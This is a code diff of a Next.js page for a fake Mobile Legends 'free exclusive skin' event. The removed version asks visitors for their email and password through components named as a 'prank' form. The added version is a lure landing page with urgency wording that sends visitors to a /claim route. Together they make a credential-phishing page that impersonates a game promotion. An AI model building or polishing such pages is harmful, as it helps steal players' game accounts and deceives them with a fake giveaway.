@@ -1,41 +1,66 @@
-"use client"; // This directive makes it a Client Component
+"use client";
 
-import Head from 'next/head'; // Still useful for setting page title
-// import Image from 'next/image'; // Uncomment if you add logos
-import { usePrankForm } from './hooks/usePrankForm';
-import { PrankFormComponent } from './components/PrankForm';
+import Head from 'next/head';
+import Link from 'next/link';
+import Image from 'next/image'; // For placeholder image
 
-export default function Home() {
-  const { email, setEmail, password, setPassword, isLoading, error, handleSubmit } = usePrankForm();
-
+export default function NewRootPage() {
   return (
     <>
       <Head>
-        <title>ML Naruto Skins - Limited Event!</title>
+        <title>🎁 Your Free Exclusive Skin Awaits! - ML Event</title>
+        <meta name="description" content="Unlock a special free skin in our limited-time Mobile Legends event! Claim yours now." />
       </Head>
-      <div className="min-h-screen bg-naruto-darkblue flex flex-col items-center justify-center p-4 text-white">
-        <div className="bg-ml-blue p-8 rounded-lg shadow-2xl w-full max-w-md transform transition-all hover:scale-105">
-          <div className="text-center mb-6">
-            {/* Example for adding an image:
-            <Image 
-              src="/path-to-your/ml-logo.png" 
-              alt="Mobile Legends Logo" 
-              width={80} 
-              height={80} 
-              className="mx-auto mb-2" // Example styling
-            /> */}
-            <h1 className="text-3xl font-bold text-naruto-orange mb-2">Exclusive Naruto Skins!</h1>
-            <p className="text-ml-gold">Log in to claim your FREE Naruto Series Skins for Mobile Legends!</p>
+      <div className="min-h-screen bg-gradient-to-tr from-purple-900 via-slate-900 to-blue-900 text-white flex flex-col items-center justify-center p-6 selection:bg-yellow-400 selection:text-slate-900">
+        <main className="text-center max-w-2xl">
+          <div className="mb-8">
+            <h1 className="text-5xl md:text-7xl font-bold mb-4">
+              <span className="bg-clip-text text-transparent bg-gradient-to-r from-yellow-400 via-orange-400 to-red-500">
+                FREE
+              </span> Exclusive Skin!
+            </h1>
+            <p className="text-xl md:text-2xl text-slate-300 mb-6">
+              As a thank you to our amazing community, a special gift is waiting for you.
+            </p>
           </div>
-          <PrankFormComponent
-            email={email} onEmailChange={setEmail}
-            password={password} onPasswordChange={setPassword}
-            isLoading={isLoading}
-            error={error}
-            onSubmit={handleSubmit}
-          />
-          <p className="mt-6 text-xs text-center text-gray-400">This event is for a limited time only. Don't miss out!</p>
-        </div>
+
+          <div className="mb-10 shadow-2xl shadow-yellow-500/30 rounded-lg overflow-hidden">
+            {/* 
+              Interesting Asset Suggestion:
+              Replace this placeholder with a dynamic image or a short looping video 
+              showcasing a mysterious gift box or a silhouette of an awesome skin.
+              You could even use a carousel if you have multiple "teaser" images.
+              Consider using a high-quality, game-themed image.
+            */}
+            <Image
+              src="https://placehold.co/800x450/0A0A23/FBBF24/png?text=Your+Mysterious+Gift!&font=orbitron"
+              alt="Mysterious Free Skin Gift"
+              width={800}
+              height={450}
+              className="w-full object-cover"
+              priority // Good for LCP if this is the main visual
+            />
+          </div>
+
+          <div className="mb-8">
+            <p className="text-lg text-slate-400 mb-6">
+              This is your chance to get a unique skin, absolutely free! Participate in our special event to unlock it.
+            </p>
+            <Link
+              href="/claim"
+              className="inline-block bg-gradient-to-r from-yellow-500 via-orange-500 to-red-600 hover:from-yellow-600 hover:to-red-700 text-white font-bold text-xl py-4 px-10 rounded-lg shadow-lg transform transition-all duration-150 ease-in-out hover:scale-105 focus:outline-none focus:ring-4 focus:ring-yellow-400 focus:ring-opacity-50"
+            >
+              Claim Your Free Skin Now!
+            </Link>
+          </div>
+
+          <p className="text-sm text-slate-500">
+            Event ends soon. Don&apos;t miss out!
+          </p>
+        </main>
+        <footer className="absolute bottom-4 text-center text-slate-600 text-xs">
+          <p>&copy; {new Date().getFullYear()} Special Event Promotions. All rights reserved (for this demo).</p>
+        </footer>
       </div>
     </>
   );
